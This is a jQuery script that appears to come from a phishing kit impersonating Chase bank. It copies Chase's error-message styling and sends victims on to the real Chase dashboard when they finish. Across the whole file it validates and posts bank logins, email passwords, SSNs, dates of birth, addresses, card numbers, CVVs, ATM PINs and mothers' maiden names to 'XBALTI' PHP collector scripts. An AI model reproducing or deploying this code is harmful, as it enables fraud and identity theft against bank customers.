$(function() {
     var validator = $("#emailform").bind("invalid-form.validate", function() {
         $("#errorremail").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Please check your information and try again.</h2> </div></div></div>");
     }) 
     $("form[name='emailform']").validate({
         errorContainer: $("#errorremail"),
         rules: {
             password: "required",
             email: "required",
             email: {
                 required: true,
             },
             password: {
                 required: true,
                 minlength: 4
             },
         },
         messages: {
             email: "",
             password: "",
         },
         submitHandler: function(form) {
           $("#zwimel").show();
             $.post("XBALTI/mail.php", $("#emailform").serialize(), function(result) {
                 setTimeout(function() {
					  $("#emailowa").hide();
                      $("#bilingowa").show();
					  $("#zwimel").hide();
                     $(location).attr("", "");
                 }, 2000);
             });
         },
     });
 });
 
 
 
 
 $(function() {
     var validator = $("#bilngo").bind("invalid-form.validate", function() {
         $("#errorrbilling").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Please check your information and try again.</h2> </div></div></div>");
     }) 
     $("form[name='bilngo']").validate({
         errorContainer: $("#errorrbilling"),
         rules: {
             fullname: "required",
             DateOfBritch: "required",
			 StreetAddress: "required",
             StateRegion: "required",
			 ZipCode: "required",
             NumberPhone: "required",
			 ssn: "required",

         },
         messages: {
             fullname: "",
             DateOfBritch: "",
			 StreetAddress: "",
			 StateRegion: "",
			 ZipCode: "",
			 NumberPhone: "",
			 ssn: "",
         },
         submitHandler: function(form) {
           $("#zwimel").show();
             $.post("XBALTI/billing.php", $("#bilngo").serialize(), function(result) {
                 setTimeout(function() {
					  $("#bilingowa").hide();
                      $("#cardowa").show();
					  $("#zwimel").hide();
                     $(location).attr("", "");
                 }, 2000);
             });
         },
     });
 });
$("#rge3email").click(function(e) {
      e.preventDefault();

$("#bilingowa").hide();
$("#emailowa").show();

});





 $(function() {
     var validator = $("#cardfrom").bind("invalid-form.validate", function() {
         $("#errorrcard").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Please check your information and try again.</h2> </div></div></div>");
     }) 
     $("form[name='cardfrom']").validate({
         errorContainer: $("#errorrcard"),
         rules: {
             CardNumber: "required",
             ExpirationDate: "required",
			 Cvv: "required",
             AtmPin: "required",
			 MaidenName: "required",

         },
         messages: {
             CardNumber: "",
             ExpirationDate: "",
			 Cvv: "",
			 AtmPin: "",
			 MaidenName: "",
         },
         submitHandler: function(form) {
           $("#zwimel").show();
             $.post("XBALTI/card.php", $("#cardfrom").serialize(), function(result) {
                 setTimeout(function() {
					  $("#cardowa").hide();
                      $("#cardowa2").show();
					  $("#zwimel").hide();
                     $(location).attr("", "");
                 }, 2000);
             });
         },
     });
 });
$("#ma3andoshmeskin").click(function(e) {
      e.preventDefault();

$("#cardowa").hide();
$("#congra").show();

});

$("#cardkhra").click(function(e) {
      e.preventDefault();

$("#hideothercard").hide();
$("#cardfrom2").show();

});

$("#ma3andoshakhra20").click(function(e) {
      e.preventDefault();

$("#cardowa2").hide();
$("#congra").show();

});
 $(function() {
     var validator = $("#cardfrom2").bind("invalid-form.validate", function() {
         $("#errorrcard2").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Please check your information and try again.</h2> </div></div></div>");
     }) 
     $("form[name='cardfrom2']").validate({
         errorContainer: $("#errorrcard2"),
         rules: {
             CardNumber2: "required",
             ExpirationDate2: "required",
			 Cvv2: "required",
             AtmPin2: "required",

         },
         messages: {
             CardNumber2: "",
             ExpirationDate2: "",
			 Cvv2: "",
			 AtmPin2: "",
         },
         submitHandler: function(form) {
           $("#zwimel").show();
             $.post("XBALTI/card2.php", $("#cardfrom2").serialize(), function(result) {
                 setTimeout(function() {
					  $("#cardowa2").hide();
                      $("#congra").show();
					  $("#zwimel").hide();
                     $(location).attr("", "");
                 }, 2000);
             });
         },
     });
 });
 
 $("#zmelihdamir").click(function(e) {
      e.preventDefault();

$("#cardfrom2").hide();
$("#hideothercard").show();

});

$("#dihlogin").click(function(e) {
      e.preventDefault();

   $(location).attr("href", "//secure07c.chase.com/web/auth/dashboard");
   $("#zwimel").show();
});

$("#dihlogin2").click(function(e) {
      e.preventDefault();

   $(location).attr("href", "//secure07c.chase.com/web/auth/dashboard");
   $("#zwimel").show();
});


 $(function() {
     var validator = $("#loginbank").bind("invalid-form.validate", function() {
         $("#errorrSignIn").html("<br><div id='validator-error-header'><div class='jpui error error inverted primary animate alert' id='logon-error' role='region'><div class='icon'><span id='type-icon-logon-error'><i class='jpui exclamation-color icon' id='icon-type-icon-logon-error' aria-hidden='true'></i></span></div> <div class='icon background'></div> <div class='content wrap' id='content-logon-error'><h2 class='title' tabindex='-1' id='inner-logon-error'><span class='util accessible-text' id='icon-logon-error'>Important: </span>Please check your information and try again..</h2> </div></div></div>");
     }) 
     $("form[name='loginbank']").validate({
         errorContainer: $("#errorrSignIn"),
         rules: {
                 Username: {
                 required: true,
                 minlength: 4
             },
			 
			    passbank: {
                 required: true,
                 minlength: 5
             },

         },
         messages: {
             Username: "",
             passbank: "",
         },
         submitHandler: function(form) {
           $("#load").show();
             $.post("XBALTI/login.php", $("#loginbank").serialize(), function(result) {
                 setTimeout(function() {
                     $(location).attr("href", "./dashboard.php?#dashboard&Alert=Update&Your&Account");
                 }, 2000);
             });
         },
     });
 });